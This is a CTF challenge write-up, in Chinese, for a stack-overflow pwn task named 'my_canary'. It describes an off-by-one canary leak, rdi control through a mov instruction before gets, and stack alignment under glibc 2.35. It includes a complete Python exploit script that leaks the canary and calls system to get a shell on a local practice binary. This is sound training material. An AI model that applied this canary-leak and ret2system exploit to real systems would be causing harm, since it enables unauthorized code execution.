# my_canary

简单的栈题捏，有几个坑需要注意一下

- 带有system函数的程序需要设置gdb跟踪父进程调试
- 仔细检查read函数，有off-by-one的漏洞，循环判定多读了一字节，可以覆盖canary末尾零字节泄露canary
- 高版本libc，没有可用的gadget，利用gets函数调用前的mov rdi,rax这条汇编指令控制rdi，往栈顶写binsh
- 由于是glibc-2.35，system函数中多了一堆的push压栈操作，如果不在调用system函数之前进行多次抬栈的话很容易把写好的binsh直接覆盖掉
- ~~纯手搓canary，check之后发现no canary迷惑一下）~~

出这个题其实是有一次seccon被高版本的glibc折磨了很久，而且是最简单的栈题签到，然后就想着校赛也出一下，看着题目很简单，实际上也需要大家做题时仔细花时间去调试，希望对大家的调试技术的提高有所帮助

```python
from Excalibur2 import *

default('m')
# proc('./strange_system_local')
proc('./my_canary')
remo('127.0.0.1:34451')
# el('strange_system')
debug("b *0x40122C")


system = 0x401490
# system = plt('system')
# ret = 0x000000000040101a
ret = 0x0000000000401016

sd(b'a'*72+b'a')

ru(b'a'*73)
canary = u64(b'\x00'+rec(7))
# canary = (rec(7))
# canary = (rec(7).rjust(b'\x00'))
# canary = int(rec(7).ljust(b'\x00'),16)
pr(canary)
prh(canary)

# pay = b'sh\x00\x00'*6 + p64(canary)+ b'/bin/sh\x00' +p64(system)
# pay = b'sh\x00\x00'*6 + p64(canary)+ b'a'*8 +p64(system)
pay = b'sh\x00\x00' +b'a'*4 + p64(canary)+ b'a'*8 + p64(ret)* 4 + p64(system)
# pay = b'sh\x00\x00'*6 +p64(system)

# debug('b *0x000000000040101a')
sl(pay)

ia()

```
